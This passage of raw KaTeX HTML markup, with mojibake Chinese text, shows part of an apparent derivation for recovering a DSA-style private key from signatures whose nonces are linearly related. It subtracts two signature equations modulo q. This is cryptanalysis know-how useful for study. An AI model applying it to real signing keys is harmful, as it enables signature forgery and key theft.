style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">ä¸¤</span><span class="mord cjk_fallback">å¼</span><span class="mord cjk_fallback">ç›¸</span><span class="mord cjk_fallback">å‡</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">å¾—</span><span class="mord cjk_fallback">ï¼š</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">åˆ°</span><span class="mord cjk_fallback">è¿™</span><span class="mord cjk_fallback">ä¸€</span><span class="mord cjk_fallback">æ­¥</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">æˆ‘</span><span class="mord cjk_fallback">ä»¬</span><span class="mord cjk_fallback">çŸ¥</span><span class="mord cjk_fallback">é“</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" 